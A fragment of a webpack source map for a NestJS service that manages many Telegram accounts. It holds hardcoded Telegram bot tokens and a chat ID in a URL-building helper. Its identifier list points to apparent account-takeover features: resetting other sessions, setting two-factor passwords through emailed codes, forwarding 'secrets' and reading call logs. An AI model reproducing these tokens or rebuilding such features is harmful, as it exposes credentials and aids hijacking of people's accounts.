received';\r\n    error = err.name || err.code || 'NoResponseError';\r\n  } else if (err.message) {\r\n    status = err.status || 'UNKNOWN';\r\n    message = err.message;\r\n    error = err.name || err.code || 'Error';\r\n  } else if (err.errorMessage) {\r\n    status = err.status || 'UNKNOWN';\r\n    message = err.errorMessage;\r\n    error = err.name || err.code || 'Error';\r\n  }\r\n\r\n  const msg = `${prefix ? `${prefix} ::` : \"\"} ${extractMessage(message)} `\r\n\r\n  const resp = { status, message: err.errorMessage || msg, error };\r\n  console.log(resp.error == 'RPCError' ? resp.message : resp);\r\n  return resp\r\n}\r\nlet botCount = 0;\r\n\r\nexport function ppplbot(chatId?: string, botToken?: string) {\r\n  let token = botToken;\r\n\r\n  if (!token) {\r\n    if (botCount % 2 === 1) {\r\n      token = 'bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY';\r\n    } else {\r\n      token = 'bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA';\r\n    }\r\n    botCount++;\r\n  }\r\n  const targetChatId = chatId || '-1001801844217'; // Replace with actual chat ID\r\n  const apiUrl = `https://api.telegram.org/${token}/sendMessage?chat_id=${targetChatId}`;\r\n  return apiUrl;\r\n};\r\n\r\nexport const defaultReactions = [\r\n  '❤', '🔥', '👏', '🥰', '😁', '🤔',\r\n  '🤯', '😱', '🤬', '😢', '🎉', '🤩',\r\n  '🤮', '💩', '🙏', '👌', '🕊', '🤡',\r\n  '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\r\n  '🤣', '💔', '🏆', '😭', '😴', '👍',\r\n  '🌚', '⚡', '🍌', '😐', '💋', '👻',\r\n  '👀', '🙈', '🤝', '🤗', '🆒',\r\n  '🗿', '🙉', '🙊', '🤷', '👎'\r\n]\r\nexport const defaultMessages = [\r\n  \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\",\r\n  \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\",\r\n  \"16\", \"17\", \"18\", \"19\", \"20\", \"21\"\r\n];\r\n\r\nexport function areJsonsNotSame(json1: any, json2: any): boolean {\r\n  const keysToIgnore = [\"id\", \"_id\"];\r\n\r\n  function deepCompare(obj1: any, obj2: any): boolean {\r\n    if (obj1 === obj2) return true;\r\n\r\n    if (typeof obj1 !== \"object\" || typeof obj2 !== \"object\" || obj1 === null || obj2 === null) {\r\n      return false;\r\n    }\r\n\r\n    const keys1 = Object.keys(obj1).filter(key => !keysToIgnore.includes(key)).sort();\r\n    const keys2 = Object.keys(obj2).filter(key => !keysToIgnore.includes(key)).sort();\r\n\r\n    if (keys1.length !== keys2.length) return false;\r\n\r\n    return keys1.every(key => deepCompare(obj1[key], obj2[key]));\r\n  }\r\n\r\n  return !deepCompare(json1, json2);\r\n}\r\n\r\nexport function mapToJson(map: Map<any, any>) {\r\n  // Convert Map to a plain object\r\n  const obj: Record<string, any> = {};\r\n  for (const [key, value] of map.entries()) {\r\n    // Convert key to string since JSON keys are always strings\r\n    obj[String(key)] = value;\r\n  }\r\n  return obj\r\n}\r\n","module.exports = require(\"@nestjs/common\");","module.exports = require(\"@nestjs/config\");","module.exports = require(\"@nestjs/core\");","module.exports = require(\"@nestjs/mapped-types\");","module.exports = require(\"@nestjs/mongoose\");","module.exports = require(\"@nestjs/platform-express\");","module.exports = require(\"@nestjs/swagger\");","module.exports = require(\"adm-zip\");","module.exports = require(\"axios\");","module.exports = require(\"big-integer\");","module.exports = require(\"class-transformer\");","module.exports = require(\"class-validator\");","module.exports = require(\"cloudinary\");","module.exports = require(\"imap\");","module.exports = require(\"mongoose\");","module.exports = require(\"multer\");","module.exports = require(\"telegram\");","module.exports = require(\"telegram/Helpers\");","module.exports = require(\"telegram/Password\");","module.exports = require(\"telegram/client/uploads\");","module.exports = require(\"telegram/events\");","module.exports = require(\"telegram/extensions/Logger\");","module.exports = require(\"telegram/sessions\");","module.exports = require(\"telegram/tl\");","module.exports = require(\"fs\");","module.exports = require(\"path\");","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n","import { NestFactory } from '@nestjs/core';\r\nimport mongoose from 'mongoose'\r\nimport { AppModule } from './app.module';\r\nimport { DocumentBuilder, SwaggerModule } from '@nestjs/swagger';\r\nimport { ValidationPipe } from '@nestjs/common';\r\n\r\nasync function bootstrap() {\r\n  const app = await NestFactory.create(AppModule);\r\n  const config = new DocumentBuilder()\r\n    .setTitle('NestJS and Express API')\r\n    .setDescription('API documentation')\r\n    .setVersion('1.0')\r\n    .build();\r\n\r\n  app.use((req, res, next) => {\r\n    res.header('Access-Control-Allow-Origin', '*');\r\n    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');\r\n    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');\r\n    next();\r\n  });\r\n\r\n  app.enableCors({\r\n    allowedHeaders: \"*\",\r\n    origin: \"*\"\r\n  });\r\n  const document = SwaggerModule.createDocument(app, config);\r\n  // fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));\r\n  SwaggerModule.setup('api', app, document);\r\n  mongoose.set('debug', true)\r\n  app.useGlobalPipes(new ValidationPipe({\r\n    transform: true,\r\n  }));\r\n  process.on('unhandledRejection', (reason, promise) => {\r\n    console.error('Unhandled Rejection at:', promise, 'reason:', reason);\r\n  });\r\n\r\n  process.on('uncaughtException', (reason, promise) => {\r\n    console.error(promise, reason);\r\n  });\r\n\r\n  let isShuttingDown = false;\r\n  const shutdown = async (signal: string) => {\r\n    if (isShuttingDown) return;\r\n    isShuttingDown = true;\r\n    console.log(`${signal} received`);\r\n    await app.close();\r\n    process.exit(0);\r\n  };\r\n\r\n  process.on('exit', async () => {\r\n    console.log('Application closed');\r\n  });\r\n\r\n  process.on('SIGINT', async () => {\r\n    await shutdown('SIGINT');\r\n  });\r\n\r\n  process.on('SIGTERM', async () => {\r\n    await shutdown('SIGTERM');\r\n  });\r\n\r\n  process.on('SIGQUIT', async () => {\r\n    await shutdown('SIGQUIT');\r\n  });\r\n\r\n  await app.init();\r\n  await app.listen(8000);\r\n}\r\nbootstrap();\r\n"],"names":["MailReader","isReady","result","this","imap","Imap","user","process","env","GMAIL_ADD","password","GMAIL_PASS","host","port","tls","tlsOptions","rejectUnauthorized","on","console","log","err","error","getInstance","instance","connectToMail","connect","parseError","disconnectFromMail","end","isMailReady","getCode","sleep","openInbox","searchCriteria","fetchOptions","bodies","markSeen","results","Promise","resolve","reject","search","length","fetch","msg","seqno","emailData","stream","info","buffer","chunk","toString","which","push","seq","addFlags","expunge","once","split","fetchNumbersFromString","openBox","AppController","constructor","appService","commonServicePath","join","__dirname","getHello","uploadFileAndUpdate","file","targetDir","filePath","existsSync","mkdirSync","recursive","fileBuffer","readFile","path","writeFile","message","Get","Post","UseInterceptors","FileInterceptor","storage","diskStorage","destination","req","cb","folderPath","filename","ApiOperation","summary","ApiConsumes","ApiBody","schema","type","properties","format","UploadedFile","Controller","AppService","AppModule","configure","consumer","apply","LoggerMiddleware","forRoutes","Module","imports","initModule","TelegramModule","ActiveChannelsModule","ClientModule","UserDataModule","UsersModule","BufferClientModule","ArchivedClientModule","ChannelsModule","PromoteClientModule","BuildModule","UpiIdModule","PromoteMsgModule","PromoteStatModule","StatModule","Stat2Module","TgSignupModule","TransactionModule","NpointModule","controllers","providers","exports","Injectable","CloudinaryService","resources","Map","cloudinary","v2","config","cloud_name","CL_NAME","api_key","CL_APIKEY","api_secret","CL_APISECRET","name","getResourcesFromFolder","downloadAndExtractZip","url","zipPath","extractPath","response","fetchWithTimeout","responseType","status","Error","fs","writeFileSync","data","AdmZip","extractAllTo","unlinkSync","folderName","createNewFolder","createFolder","uploadFilesToFolder","overwriteFile","uploader","upload","resource_type","overwrite","invalidate","public_id","findAndSaveResources","api","prefix","max_results","all","map","async","resource","set","extension","substring","lastIndexOf","rootPath","cwd","mypath","res","statusText","saveFile","create_folder","uploadPromises","Array","from","entries","key","upload_large","folder","printResources","forEach","val","get","publicId","getBuffer","Configuration","Schema","versionKey","autoIndex","strict","timestamps","toJSON","virtuals","transform","doc","ret","_id","ConfigurationSchema","SchemaFactory","createForClass","add","Types","Mixed","ConfigurationController","configurationService","findOne","update","updateClientDto","Patch","Object","Body","ApiTags","ConfigurationService","connection","onModuleInit","clientId","ppplbot","encodeURIComponent","onModuleDestroy","closeConnection","close","Global","ConfigModule","forRoot","MongooseModule","forRootAsync","useFactory","uri","mongouri","forFeature","collection","Inject","getConnectionToken","Connection","configurationModel","setEnv","OnModuleInit","exec","NotFoundException","updatedUser","findOneAndUpdate","$set","new","upsert","InjectModel","Model","TelegramController","telegramService","connectToTelegram","mobile","createClient","connectClient","disconnect","deleteClient","disconnectAll","getMessages","username","limit","getMessagesNew","chatId","offset","getChatId","sendInlineMessage","lastActiveTime","getLastActiveTime","joinChannels","channels","removeOtherAuths","getSelfMsgsInfo","createGroup","forwardSecrets","fromId","joinChannelAndForward","channel","leaveChannel","getCallLog","getMe","getMedia","getmedia","getChannelInfo","sendIds","leaveChannels","getAuths","set2Fa","setProfilePic","updatePrivacy","updateUsername","getGrpMembers","addContact","addContactDto","addContacts","addContactsDto","phoneNumbers","newSession","createNewSession","updateName","firstName","about","updateNameandBio","getMediaMetadata","downloadMediaFile","messageId","downloadProfilePic","index","send","download","unlink","forrward","forwardMessage","deleteChat","deleteProfilePics","deleteProfilePhotos","ApiParam","description","required","Param","ApiQuery","Query","String","AddContactDto","ApiResponse","example","success","addedContacts","AddContactsDto","Res","TelegramService","forwardRef","usersService","bufferClientService","activeChannelsService","channelsService","getActiveClientSetup","setActiveClientSetup","getClient","number","client","clientsMap","connected","hasClient","has","cli","delete","phoneNumber","clear","clearJoinChannelInterval","autoDisconnect","handler","BadRequestException","telegramManager","session","setTimeout","setInterval","errorDetails","contains","toLowerCase","updateByFilter","$or","tgId","expired","telegramClient","getchatId","tryJoiningChannel","chatEntity","joinChannel","canSendMsgs","remove","channelId","removeChannels","errorMessage","includes","channelDetails","searchError","private","entity","getSelfMSgsInfo","fromChatId","createGroupAndForward","getMediaMessages","getDialogs","archived","channelInfo","set2fa","HttpException","parseInt","updatePrivacyforDeletedAccount","updateProfilePic","leaveChannelIds","canSendFalseChats","updateProfile","UsersService","ActiveChannelsService","ChannelsService","BufferClientService","TelegramManager","sessionString","StringSession","channelArray","activeClientSetup","groupDescription","invoke","Api","CreateChannel","title","megagroup","forImport","id","accessHash","chats","folders","EditPeerFolders","folderPeers","InputFolderPeer","peer","InputPeerChannel","folderId","InviteToChannel","InputChannel","users","forwardSecretMsgs","toChatId","totalMessages","forwardedCount","messages","offsetId","total","messageIds","media","filter","undefined","forwardMessages","fromPeer","i","slice","_destroyed","getInputEntity","errorHandler","handlerFn","TelegramClient","API_ID","API_HASH","connectionRetries","setLogLevel","LogLevel","ERROR","_errorHandler","me","phone","addEventHandler","event","NewMessage","handleEvents","chat","getEntity","Chat","Channel","participants","GetParticipants","ChannelParticipantsRecent","hash","bigInt","ChannelParticipants","userInfo","ChannelParticipant","userId","userDetails","lastName","JSON","stringify","entityLike","params","getLastMsgs","msgs","resp","text","selfChatId","photoCount","ownPhotoCount","ownVideoCount","otherPhotoCount","otherVideoCount","videoCount","movieCount","messageHistory","toLocaleLowerCase","photo","fwdFrom","video","canSendTrueCount","canSendFalseCount","totalCount","isChannel","isGroup","broadcast","defaultBannedRights","sendMessages","replace","chatsArrayLength","ids","namePrefix","contacts","AddContact","e","mobiles","inputContacts","InputPhoneContact","ImportContacts","LeaveChannel","JoinChannel","account","GetAuthorizations","auth","authorizations","isAuthMine","appName","country","deviceModel","resetAuthorization","ResetAuthorization","getAllChats","chatData","className","thumbnailUrl","getMediaUrl","date","sender","senderId","is_self","out","MessageMediaPhoto","sizes","downloadMedia","thumb","MessageMediaDocument","document","mimeType","startsWith","thumbs","button","sendMessage","buttons","KeyboardButtonUrl","Search","InputPeerEmpty","q","InputMessagesFilterPhotos","minDate","maxDate","addOffset","maxId","minId","callLogs","InputMessagesFilterPhoneCalls","action","MessageActionPhoneCall","filteredResults","outgoing","incoming","chatCallCounts","totalCalls","logAction","peerId","ent","count","filteredChatCallCounts","details","isPrivate","Date","SetPrivacy","InputPrivacyKeyPhoneCall","rules","InputPrivacyValueDisallowAll","InputPrivacyKeyProfilePhoto","InputPrivacyValueAllowAll","InputPrivacyKeyPhoneNumber","InputPrivacyKeyStatusTimestamp","InputPrivacyKeyAbout","UpdateProfile","photoIndex","photos","GetUserPhotos","selectedPhoto","Math","max","photoFileSize","photoBuffer","downloadFile","InputPhotoFileLocation","fileReference","thumbSize","dcId","outputPath","latest","dateActive","toISOString","getContacts","GetContacts","DeleteHistory","justClear","revoke","blockUser","Block","downloadWithTimeout","promise","timeout","race","_","query","mediaMessages","endOfMessages","thumbBuffer","mediaType","downloadError","warn","retryAfter","match","MessageMediaEmpty","contentType","fileLocation","inputLocation","InputDocumentFileLocation","setHeader","chunkSize","iterDownload","requestSize","write","baseUsername","newUserName","increment","UpdateUsername","CheckUsername","InputPrivacyKeyForwards","getFileUrl","writer","createWriteStream","pipe","image","uploadFile","CustomFile","statSync","size","workers","UploadProfilePhoto","hasPassword","GetPassword","imapService","twoFaDetails","email","hint","newPassword","checkMailInterval","clearInterval","updateTwoFaSettings","isCheckPassword","emailCodeCallback","retry","codeInterval","code","onEmailCodeError","sendPhotoChat","caption","sendFile","sendFileChat","DeletePhotos","newClient","start","phoneCode","waitForOtp","onError","save","now","trim","ApiProperty","TgSignupController","clients","restAcc","sendCode","randomIndex","floor","random","creds","apiHash","apiId","TgSignupService","destroy","deleteMessages","forceSMS","sendResult","SendCode","settings","CodeSettings","SentCodeSuccess","phoneCodeHash","SentCodeTypeSms","isCodeViaApp","SentCodeTypeApp","resendResult","ResendCode","sendCodeError","login","passowrd","termsOfService","isRegistrationRequired","SignIn","AuthorizationSignUpRequired","processLogin","passwordSrpResult","passwordSrpCheck","computeCheck","CheckPassword","SignUp","help","AcceptTermsOfService","getCallLogs","zero","callInfo","callId","value","duration","timestamp","sess","payload3","gender","userName","personalChats","calls","totalChats","lastActive","tgcms","post","headers","verifyCode","mesaage","ActiveChannelsController","create","createActiveChannelDto","createMultiple","createChannelDtos","findAll","updateActiveChannelDto","addReaction","addReactionDto","reactions","addReactions","getRandomReaction","removeReaction","CreateActiveChannelDto","Boolean","Number","UpdateActiveChannelDto","Delete","AddReactionDto","ActiveChannel","ActiveChannelSchema","activeChannelModel","promoteMsgsService","availableMsgs","keys","bulkOps","dto","updateOne","bulkWrite","ordered","find","removeFromAvailableMsgs","$pull","addToAvailableMsgs","$addToSet","findOneAndDelete","reaction","getActiveChannels","skip","notIds","participantsCount","$gt","$ne","restricted","forbidden","sort","aggregate","$match","$skip","$limit","$sort","$project","randomField","executeQuery","queryExec","InternalServerErrorException","resetWordRestrictions","updateMany","banned","resetAvailableMsgs","$expr","$lt","$size","$ifNull","updateBannedChannels","updateDefaultReactions","PromoteMsgsService","reactRestricted","wordRestriction","dMRestriction","default","PartialType","Prop","unique","mongoose","defaultMessages","defaultReactions","ArchivedClientController","archivedclientService","createClientDto","checkArchivedClients","fetchOne","CreateClientDto","SearchClientDto","UpdateClientDto","ArchivedClientService","ClientSchema","archivedclientModel","clientService","promoteRepl","product","_doc","deletedUser","$regex","RegExp","archivedClients","clientIds","ClientService","BufferClientController","joinChannelsforBufferClients","joinchannelForBufferClients","checkbufferClients","checkBufferClients","addNewUserstoBufferClients","body","badIds","goodIds","setAsBufferClient","createdOrupdate","createOrUpdate","CreateBufferClientDto","SearchBufferClientDto","UpdateBufferClientDto","Put","BufferClientSchema","bufferClientModel","promoteClientService","joinChannelMap","bufferClient","throwErr","returnDocument","createOrUpdateUserDto","existingUser","deleteOne","deletedCount","removeFromBufferMap","clearBufferMap","skipExisting","existingkeys","$nin","joinChannelQueue","joinChannelIntervalId","shift","availableDate","ConflictException","clientMobiles","flatMap","promoteMobile","bufferclients","promoteclients","promoteclientIds","sixMonthsAgo","documents","twoFA","pop","PromoteClientService","IsString","IsNumber","ApiPropertyOptional","IsOptional","BufferClient","BuildController","buildService","BuildService","BuildSchema","buildModel","npointSerive","updateDocument","NpointService","Build","ChannelsController","createChannelDto","updateChannelDto","CreateChannelDto","SearchChannelDto","UpdateChannelDto","ChannelSchema","ChannelModel","getChannels","keywords","pattern","notPattern","$and","$not","$addFields","$rand","ClientController","HttpStatus","BAD_REQUEST","updateClient","findAllMasked","INTERNAL_SERVER_ERROR","NOT_FOUND","requestBody","addPromoteMobile","mobileNumber","removePromoteMobile","Client","settingupClient","clientModel","archivedClientService","refreshMap","checkNpoint","existingClient","areJsonsNotSame","clientData","mapToJson","maskedCls","maskedClient","updatedAt","lean","values","allClients","every","uptimeChecker","uptimebot","setupClient","setupClientQueryDto","toBoolean","AUTO_CLIENT_SETUP","existingClientMobile","$lte","newBufferClient","existingMobile","newMobile","updateClientSession","setup","days","archiveOld","formalities","updatedUsername","toUpperCase","existingClientUser","deployKey","bufferClientDto","updatedBufferClient","dbcoll","updateClients","generateNewSession","attempt","Transform","Matches","IsUrl","v","IsArray","ArrayNotEmpty","each","NpointController","npointService","fetchDocument","postDocument","fetchAllDocuments","updatedDocument","content","logger","Logger","csrfToken","cookie","baseUrl","signInUrl","fetchCsrfToken","debug","method","maxBodyLength","Infinity","request","fetchCsrfTokenFromHtml","ensureCsrfToken","documentId","token","put","csrfTokenMatch","CreatePromoteClientDto","SearchPromoteClientDto","UpdatePromoteClientDto","PromoteClientController","joinChannelsforPromoteClients","joinchannelForPromoteClients","checkpromoteClients","checkPromoteClients","addNewUserstoPromoteClients","setAsPromoteClient","PromoteClientSchema","promoteClientModel","promoteClient","removeFromPromoteMap","clearPromoteMap","parsedError","clientPromoteMobiles","bufferClients","bufferClientIds","PromoteClient","PromoteMsgsController","PromoteMsgSchema","PromoteMsg","promotemsgModel","CreatePromoteStatDto","UpdatePromoteStatDto","PromoteStatController","promoteStatService","createPromoteStatDto","findByClient","updatePromoteStatDto","deleteAll","PromoteStatService","PromoteStat","PromoteStatSchema","promoteStatModel","promoteStat","deleteMany","reinitPromoteStats","uniqueChannels","releaseDay","lastUpdatedTimeStamp","of","CreateStatDto","Stat2Controller","statService","createStatDto","findByChatIdAndProfile","profile","updateStatDto","UpdateStatDto","Stat2Service","StatSchema","Stat2","statModel","stat","StatController","StatService","Stat","CreateTransactionDto","UpdateTransactionDto","Transaction","Document","TransactionSchema","TransactionController","transactionService","createTransactionDto","updateTransactionDto","TransactionService","transactionModel","newTransaction","transaction","findById","transactionId","$options","issue","transactions","countDocuments","updatedTransaction","findByIdAndUpdate","deletedTransaction","findByIdAndDelete","UpiIdController","UpiIdService","updateUpiIdsdto","UpiIdSchema","UpiId","UpiIdModel","upiIds","then","refreshUPIs","existingUpiIds","CreateUserDataDto","SearchDto","UpdateUserDataDto","UserData","UserDataSchema","UserDataController","userDataService","createUserDataDto","updateAll","updateUserDataDto","clearCount","UserDataService","userDataModel","callCounts","currentCount","resetPaidUsers","payAmount","limitTime","paidReply","CreateUserDto","SearchUserDto","IsBoolean","UpdateUserDto","User","UserSchema","UsersController","createUserDto","queryParams","updateUserDto","userModel","clientsService","matchedCount","modifiedCount","use","next","originalUrl","ip","some","endpoint","statusCode","verbose","ms","str","arr","element","options","maxRetries","fetchWithProtocol","version","source","CancelToken","cancel","cancelToken","family","clearTimeout","isCancel","retryCount","responseIPv4","responseIPv6","inputString","matches","botToken","botCount","json1","json2","keysToIgnore","deepCompare","obj1","obj2","keys1","keys2","obj","extractMessage","isArray","item","resultString","errors","module","require","__webpack_module_cache__","__webpack_require__","moduleId","cachedModule","__webpack_modules__","call","app","NestFactory","DocumentBuilder","setTitle","setDescription","setVersion","build","header","enableCors","allowedHeaders","origin","SwaggerModule","createDocument","useGlobalPipes","ValidationPipe","reason","isShuttingDown","shutdown","signal","exit","init","listen","bootstrap"],"sourceRoot":""}